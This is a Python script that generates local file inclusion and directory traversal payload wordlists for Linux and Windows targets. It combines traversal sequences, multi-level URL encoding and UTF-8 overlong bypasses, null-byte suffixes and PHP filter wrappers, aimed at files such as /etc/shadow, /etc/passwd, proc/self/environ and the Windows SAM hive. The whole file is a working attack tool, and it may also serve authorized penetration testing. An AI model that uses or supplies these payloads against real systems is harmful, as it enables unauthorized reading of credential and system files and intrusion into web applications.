#!/usr/bin/env python3
# LFI / Directory Traversal wordlist generator by m14r41

LINUX_FILES = [
    "etc/passwd",
    "etc/shadow",
    "etc/hosts",
    "etc/issue",
    "proc/self/environ",
]

WINDOWS_FILES = [
    "windows/win.ini",
    "windows/system32/drivers/etc/hosts",
    "boot.ini",
    "windows/system32/config/sam",
    "windows/system.ini",
]

# Traversal / filter-bypass sequences (one "step up" per token, repeated by depth)
TRAVERSALS = [
    "../", "..\\",                     # plain unix / windows
    "..%2f", "..%5c",                  # url-encoded / \
    "%2e%2e%2f", "%2e%2e%5c",          # fully url-encoded
    "..%252f", "..%255c",              # double url-encoded
    "..%25252f", "..%25255c",          # triple url-encoded
    "%%32%65%%32%65%%32%66",           # double-enc alt (%%32%65 = %2e) unix
    "%%32%65%%32%65%%35%63",           # double-enc alt windows
    "....//", "....\\\\",              # strip-once filter bypass
    "..%c0%af", "..%c1%9c",            # utf-8 overlong
    "%2e%2e/", "..%2f%2e%2e%2f",       # mixed / nested
    "..////", "..\\\\\\\\",            # redundant separators
    "..%2f..%5c",                      # alternating sep
    "/..\\",                           # mixed leading
    ".\\./", ".//.\\/",                # doubled-dot forms
]

# Normalization / no-up tokens (repeated by depth, usually need a leading slash)
NORM_TOKENS = ["./", ".../", "...//"]

# Absolute-path prefixes (depth-independent)
ABS_PREFIXES = ["/", "\\", "C:\\", "C:/", "file:///"]

# PHP stream wrappers
PHP_WRAPPERS = [
    "php://filter/convert.base64-encode/resource=",
    "php://filter/read=string.rot13/resource=",
    "php://filter/resource=",
    "file://",
]

# Terminators: null byte, fragment, and extension-suffix bypasses
SUFFIXES = ["", "%00", "%2300", "%00.jpg", "%00.png", "%00.html"]


def gen(files, start, end, wrappers, absolute):
    out = set()
    for f in files:
        f_bslash = f.replace("/", "\\")
        # absolute paths (no traversal)
        if absolute:
            for ap in ABS_PREFIXES:
                for suf in SUFFIXES:
                    out.add(f"{ap}{f}{suf}")
        # traversal payloads
        for trav in TRAVERSALS:
            plain_bslash = trav == "..\\"
            tgt = f_bslash if plain_bslash else f
            leads = ["", "\\"] if plain_bslash else [""]
            for depth in range(start, end + 1):
                seq = trav * depth
                for lead in leads:
                    core = lead + seq + tgt
                    for suf in SUFFIXES:
                        out.add(f"{core}{suf}")
        # normalization tokens (leading slash form)
        for tok in NORM_TOKENS:
            for depth in range(start, end + 1):
                for suf in SUFFIXES:
                    out.add(f"/{tok * depth}{f}{suf}")
        # php wrappers (depth-independent, points at traversal)
        if wrappers:
            for w in PHP_WRAPPERS:
                for depth in range(start, end + 1):
                    out.add(f"{w}{'../' * depth}{f}")
    return sorted(out)


def ask(prompt, default):
    val = input(f"{prompt} [{default}]: ").strip()
    return val if val else str(default)


def yesno(prompt, default="n"):
    val = input(f"{prompt} (y/n) [{default}]: ").strip().lower()
    return (val or default) == "y"


def main():
    print("Target OS:  1. Windows   2. Linux   (blank = both)")
    choice = input("Select [both]: ").strip()

    if choice == "1":
        files, outfile = WINDOWS_FILES, "windows.txt"
    elif choice == "2":
        files, outfile = LINUX_FILES, "linux.txt"
    else:
        files, outfile = WINDOWS_FILES + LINUX_FILES, "lfi-win-linux.txt"

    start = int(ask("Directories back FROM", 1))
    end = int(ask("Directories back TO", 10))
    if start > end:
        start, end = end, start

    absolute = yesno("Include absolute paths (/etc/passwd, C:\\...)", "y")
    wrappers = yesno("Include PHP wrappers (php://filter...)", "n")

    payloads = gen(files, start, end, wrappers, absolute)
    with open(outfile, "w") as fh:
        fh.write("\n".join(payloads) + "\n")
    print(f"[+] {len(payloads)} payloads ({start}-{end} deep) -> {outfile}")


if __name__ == "__main__":
    main()